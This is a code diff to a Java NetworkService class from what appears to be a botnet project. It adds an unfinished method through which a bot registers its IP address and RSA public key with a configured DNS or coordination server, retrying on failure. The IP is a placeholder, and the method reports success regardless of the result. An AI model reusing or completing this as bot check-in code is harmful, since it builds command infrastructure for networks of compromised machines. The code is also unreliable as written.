@@ -22,6 +22,7 @@ import cs.sii.domain.Conversions;
 import cs.sii.domain.IP;
 import cs.sii.domain.SyncIpList;
 import cs.sii.model.bot.Bot;
+import cs.sii.service.crypto.CryptoPKI;
 
 @Service("NetworkService")
 public class NetworkService {
@@ -39,6 +40,9 @@ public class NetworkService {
 
 	@Autowired
 	private AsyncRequest asyncRequest;
+	
+	@Autowired
+	private CryptoPKI pki;
 
 	private static final String IP_REGEX = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
 	private static final String MAC_REGEX = "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$";
@@ -182,7 +186,36 @@ public class NetworkService {
 	}
 	
 	
-	
+	//TODO DA VEDERE
+	public Boolean updateDnsInformation(){
+
+		String url = "http://" + engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
+		Boolean result = false;
+		Integer counter = 0;
+
+		while (counter <= AsyncRequest.REQNUMBER) {
+			try {
+				result = asyncRequest.sendInfoToDnsServer(url,new IP("METTI IL MIO IP"),pki.getPubRSAKey());
+
+				System.out.println("Ip tornato " + result);
+
+
+				return Boolean.TRUE;
+			} catch (Exception ex) {
+				System.err.println("Errore durante aggiornamento info DNS\n" + ex);
+				counter++;
+			}
+
+			try {
+				Thread.sleep(250);
+			} catch (InterruptedException e) {
+				e.printStackTrace();
+			}
+		}
+
+		return Boolean.FALSE;
+		
+	}
 	
 	public boolean updateBotNetwork() {
 		return true;
